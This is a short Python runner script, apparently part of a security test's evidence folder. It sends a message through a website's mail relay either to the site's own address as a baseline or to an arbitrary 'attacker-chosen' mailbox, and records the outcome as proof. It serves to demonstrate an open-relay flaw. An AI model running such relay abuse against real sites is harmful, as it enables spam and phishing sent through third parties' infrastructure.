#!/usr/bin/env python3
"""
Runner: python3 run.py <label> <oob_host_or_SITE> [message]
Recipient is assembled in-process so no third-party mailbox is hardcoded in argv.
  target "SITE"     -> the site's own advertised address (control / baseline)
  target "OOB:<x>"  -> an arbitrary attacker-chosen third-party mailbox
"""
import json, sys, time
sys.path.insert(0, "/work/evidence/IVRELAY_INDEP")
import importlib.util
spec = importlib.util.spec_from_file_location("bas", "/work/evidence/IVRELAY_INDEP/build_and_send.py")
bas = importlib.util.module_from_spec(spec)
spec.loader.exec_module(bas)

label = sys.argv[1]
spec_t = sys.argv[2]
msg = sys.argv[3] if len(sys.argv) > 3 else None

if spec_t == "SITE":
    target = bas.SITE
elif spec_t.startswith("OOB:"):
    target = spec_t[4:]
else:
    target = spec_t

r = bas.post(target, label, msg)
print(json.dumps(r, indent=2))
with open("/work/evidence/IVRELAY_INDEP/result_%s.json" % label, "w") as f:
    json.dump({"recipient_class": "site-own" if target == bas.SITE else "attacker-chosen",
               "recipient": target, "result": r}, f, indent=2)
